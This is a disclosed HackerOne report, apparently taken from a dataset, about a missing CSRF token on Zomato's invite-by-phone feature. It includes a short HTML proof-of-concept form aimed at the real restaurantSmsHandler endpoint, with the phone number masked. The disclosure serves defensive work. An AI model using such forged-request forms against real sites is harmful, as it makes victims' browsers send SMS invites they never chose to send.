---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '113865'
original_report_id: '113865'
title: CSRF AT INVITING PEOPLE THOUGH PHONE NUMBER
weakness: Violation of Secure Design Principles
team_handle: zomato
created_at: '2016-02-01T14:07:30.808Z'
disclosed_at: '2016-09-14T15:10:19.652Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- violation-of-secure-design-principles
---

# CSRF AT INVITING PEOPLE THOUGH PHONE NUMBER

## Metadata

- HackerOne Report ID: 113865
- Weakness: Violation of Secure Design Principles
- Program: zomato
- Disclosed At: 2016-09-14T15:10:19.652Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello,

Please Add CSRF Token While Inviting The User Though Phone Number , You Have Good Rate Limit Protection But At The Same Time Add CSRF TOKEN :-

CODE :-

<html>
<body>
<form action="https://www.zomato.com/php/restaurantSmsHandler">
<input type="hidden" name="type" value="zomato&#45;app&#45;details" />
<input type="hidden" name="mobile&#95;no" value="xxxxxxxxxxxxxx" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>

Thanks!

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
